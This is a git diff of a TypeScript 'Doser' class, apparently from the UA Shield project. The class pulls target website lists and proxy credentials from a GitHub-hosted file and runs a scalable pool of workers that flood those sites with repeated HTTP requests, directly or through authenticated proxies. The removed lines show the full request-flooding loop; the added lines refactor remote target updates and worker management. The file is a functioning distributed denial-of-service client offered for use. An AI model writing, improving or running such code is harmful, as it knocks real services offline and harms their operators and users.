@@ -1,46 +1,42 @@
-import axios, { AxiosError } from 'axios-https-proxy-fix'
+import axios from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
+import { DoserEventType, TargetData, ProxyData, SiteData } from './worker.types'
+import { Runner } from './runner'
 
-interface ProxyData {
-  auth: string
-  id: number
-  ip: string
-}
-
-interface SiteData {
-  atack: number
-  id: number
-  // eslint-disable-next-line camelcase
-  need_parse_url: number
-  page: string
-  // eslint-disable-next-line camelcase
-  page_time: number
-  url: string
-}
-
-interface TargetData {
-  site: SiteData
-  proxy: Array<ProxyData>
-}
-
-export type DoserEventType = 'atack' | 'error'
+const CONFIGURATION_INVALIDATION_TIME = 300000
 
 export class Doser {
   private onlyProxy: boolean
   private hosts: Array<string> = []
   private working: boolean
-  private workers: number
+  private workers: Runner[] = []
+  private numberOfWorkers = 0
   private eventSource: EventEmitter
+  private ddosConfiguration: {
+    updateTime: Date;
+    sites: SiteData[];
+    proxies: ProxyData[];
+  } | null = null
 
-  private workerActive: Array<boolean>
-
-  constructor (onlyProxy: boolean, workers: number) {
+  constructor (onlyProxy: boolean, numberOfWorkers: number) {
     this.onlyProxy = onlyProxy
     this.working = false
-    this.workers = workers
     this.eventSource = new EventEmitter()
-    this.workerActive = new Array<boolean>(256)
-    this.workerActive.fill(false)
+    this.initialize(numberOfWorkers).catch(error => {
+      console.error('Wasnt able to initialize:', error)
+    })
+  }
+
+  private async initialize (numberOfWorkers: number, attemptNumber = 1): Promise<void> {
+    const config = await this.getSitesAndProxies()
+    if (!config) {
+      console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
+      return this.initialize(numberOfWorkers, attemptNumber + 1)
+    }
+    console.debug('Initialized doser', config)
+    this.updateConfiguration(config)
+    this.listenForConfigurationUpdates()
+    return this.setWorkersCount(numberOfWorkers)
   }
 
   forceProxy (newVal: boolean) {
@@ -52,7 +48,34 @@ export class Doser {
     // this.hosts = response.data as Array<string>
   }
 
-  async getSitesAndProxyes () {
+  private updateConfiguration (configuration: { sites: SiteData[]; proxies: ProxyData[] }) {
+    this.ddosConfiguration = {
+      ...configuration,
+      updateTime: new Date()
+    }
+    this.workers.forEach(worker => {
+      worker.updateConfiguration(configuration)
+    })
+  }
+
+  private listenForConfigurationUpdates (wasPreviousUpdateSuccessful = true) {
+    // eslint-disable-next-line @typescript-eslint/no-misused-promises
+    setTimeout(async () => {
+      if (!this.ddosConfiguration) {
+        return this.listenForConfigurationUpdates(false)
+      }
+
+      const config = await this.getSitesAndProxies()
+      if (!config) {
+        console.debug('Wasnt able to get configuration updates')
+        return this.listenForConfigurationUpdates(false)
+      }
+      this.updateConfiguration(config)
+      this.listenForConfigurationUpdates(true)
+    }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
+  }
+
+  async getSitesAndProxies (): Promise<{ sites: SiteData[]; proxies: ProxyData[]} | null> {
     while (this.working) { // escaping unavailable hosts
       try {
         const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
@@ -62,11 +85,11 @@ export class Doser {
         if (proxyResponse.status !== 200) continue
 
         const sites = sitesResponse.data as Array<SiteData>
-        const proxyes = proxyResponse.data as Array<ProxyData>
+        const proxies = proxyResponse.data as Array<ProxyData>
 
         return {
           sites,
-          proxyes
+          proxies
         }
       } catch (e) {
         console.log('Error while loading hosts')
@@ -100,118 +123,68 @@ export class Doser {
     return null
   }
 
-  start () {
-    this.working = true
-    this.setWorkersCount(this.workers)
-    for (let i = 0; i < 256; i++) {
-      const setI = i
-      setImmediate(() => void this.worker.bind(this)(setI))
+  setWorkersCount (newCount: number) {
+    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
+    if (newCount < this.numberOfWorkers) {
+      for (let i = this.numberOfWorkers; i >= newCount; i--) {
+        this.workers[i]?.eventSource.removeAllListeners()
+        this.workers[i]?.stop()
+      }
+      this.workers = this.workers.slice(0, newCount)
+    } else {
+      while (this.workers.length < newCount) {
+        const newWorker = this.createNewWorker()
+        this.workers.push(newWorker)
+        if (this.working) {
+          newWorker.start().catch(error => {
+            console.debug('Wasnt able to start new runner:', error)
+          })
+        }
+      }
     }
+
+    this.numberOfWorkers = newCount
   }
 
-  setWorkersCount (newCount: number) {
-    this.workers = newCount
-    for (let wIndex = 0; wIndex < 256; wIndex++) {
-      this.workerActive[wIndex] = (wIndex < newCount)
-    }
+  start () {
+    this.working = true
+    this.workers.forEach((worker, i) => {
+      console.debug(`Starting runner ${i}..`)
+      worker.start().catch(error => {
+        console.error(`Wasnt able to start worker #${i} - `, error)
+      })
+    })
   }
 
   stop () {
     this.working = false
+    this.workers.forEach((worker, i) => {
+      console.debug(`Stopping runner ${i}..`)
+      worker.stop()
+    })
+  }
+
+  private createNewWorker (): Runner {
+    console.debug('Creating new worker..')
+    // Should never happen
+    if (!this.ddosConfiguration) {
+      throw new Error('Cannot create worker without configuration')
+    }
+    const worker = new Runner({
+      sites: this.ddosConfiguration.sites,
+      proxies: this.ddosConfiguration.proxies,
+      onlyProxy: this.onlyProxy
+    })
+    worker.eventSource.on('attack', event => {
+      this.eventSource.emit('atack', {
+        type: 'atack',
+        ...event
+      })
+    })
+    return worker
   }
 
   listen (event: DoserEventType, callback: (data: any)=>void) {
     this.eventSource.addListener(event, callback)
-  }
-
-  private async worker (workerIndex: number) {
-    let config = await this.getSitesAndProxyes()
-    let configTimestamp = new Date()
-    while (this.working) {
-      if (!this.workerActive[workerIndex]) {
-        await new Promise(resolve => setTimeout(resolve, 10000))
-        continue
-      }
-
-      if ((new Date()).getTime() - configTimestamp.getTime() > 300000) {
-        config = await this.getSitesAndProxyes()
-        configTimestamp = new Date()
-      }
-
-      if (config == null) {
-        break
-      }
-
-      const target = {
-        site: config.sites[Math.floor(Math.random() * config.sites.length)],
-        proxy: config.proxyes
-      } as TargetData
-
-      // check if direct request can be performed
-      let directRequest = false
-      if (!this.onlyProxy) {
-        try {
-          const response = await axios.get(target.site.page, { timeout: 10000 })
-          directRequest = response.status === 200
-        } catch (e) {
-          this.eventSource.emit('error', { type: 'error', error: e })
-          directRequest = false
-        }
-      }
-
-      const ATACKS_PER_TARGET = 64
-
-      let proxy = null
-      for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
-        try {
-          if (directRequest) {
-            const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
-            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
-          } else {
-            if (proxy === null) {
-              proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
-            }
-            const proxyAddressSplit = proxy.ip.split(':')
-            const proxyIP = proxyAddressSplit[0]
-            const proxyPort = parseInt(proxyAddressSplit[1])
-            const proxyAuthSplit = proxy.auth.split(':')
-            const proxyUsername = proxyAuthSplit[0]
-            const proxyPassword = proxyAuthSplit[1]
-
-            const r = await axios.get(target.site.page, {
-              timeout: 10000,
-              validateStatus: () => true,
-              proxy: {
-                host: proxyIP,
-                port: proxyPort,
-                auth: {
-                  username: proxyUsername,
-                  password: proxyPassword
-                }
-              }
-            })
-
-            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
-
-            if (r.status === 407) {
-              console.log(proxy)
-              proxy = null
-            }
-          }
-        } catch (e) {
-          console.log(e)
-          proxy = null
-          let code = (e as AxiosError).code
-          if (code === undefined) {
-            console.log(e)
-            code = 'UNKNOWN'
-          }
-          this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
-          if (code === 'ECONNABORTED') {
-            break
-          }
-        }
-      }
-    }
   }
 }
